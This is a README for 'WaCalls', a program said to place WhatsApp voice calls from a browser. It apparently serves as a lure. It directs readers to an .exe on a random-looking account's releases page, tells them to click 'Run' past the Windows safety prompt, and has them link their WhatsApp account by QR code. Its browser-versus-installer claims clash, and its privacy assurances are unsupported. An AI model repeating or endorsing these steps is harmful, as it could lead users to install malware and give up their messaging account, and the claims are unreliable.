# 📞 WaCalls - Make Voice Calls From Your Browser

[![](https://img.shields.io/badge/Download_Windows_Installer-blue?style=for-the-badge)](https://github.com/fourpronged-czaralexanderii185/WaCalls/releases)

WaCalls lets you use WhatsApp voice calls directly from your web browser. You connect your account once using a quick scan process. After you connect, you manage your calls from a simple dashboard. This software works on local networks and supports multiple accounts.

## 🚀 Getting Started

Follow these steps to set up the software on your Windows computer.

1. First, visit the [official download page](https://github.com/fourpronged-czaralexanderii185/WaCalls/releases).
2. Look for the latest version under the "Assets" section.
3. Click the file that ends in .exe to start your download.
4. Open the file once the download finishes. Windows might show a safety prompt. Select "Run" to continue.
5. Follow the instructions on your screen to install the program.

## ⚙️ How to Connect Your Account

After the install finishes, open WaCalls from your desktop shortcut. You must link your account before you can make calls.

1. Open the application window.
2. A QR code will appear on your screen.
3. Open WhatsApp on your phone.
4. Go to Settings and tap "Linked Devices."
5. Tap "Link a Device."
6. Point your phone camera at the QR code on your computer screen.
7. Wait a few seconds for the app to sync your data.

## 🎧 Making Voice Calls

Once you finish the sync, the dashboard shows your contact list. 

1. Click on any contact name to open the call panel.
2. Click the green phone icon to start a call.
3. Your browser will ask for permission to use your microphone. Click "Allow" so the other person can hear you.
4. Use the controls on the screen to mute your microphone or change your volume during the call.
5. Tap the red button to end the call when you finish.

Your computer needs to meet these basic standards for smooth performance:

*   Storage: 200MB of free disk space.
*   Connection: A stable internet connection.
*   Hardware: A working microphone and speaker set.

## 🛠️ Troubleshooting Common Issues

If you encounter problems, check these items first.

*   Check your internet connection status.
*   Ensure your browser supports modern web standards. Chrome, Edge, and Firefox work best.
*   Check that your computer microphone settings allow access for this application.
*   Restart the application if the call dashboard does not load your contact list.
*   Re-scan the QR code if the connection drops.

## 🔒 Privacy and Security

Your privacy remains the priority. The application handles your media traffic locally. This means your data travels directly between your computer and the network. The software does not store your voice recordings or call logs on external servers. Every call uses encryption to ensure third parties cannot listen to your private conversations.
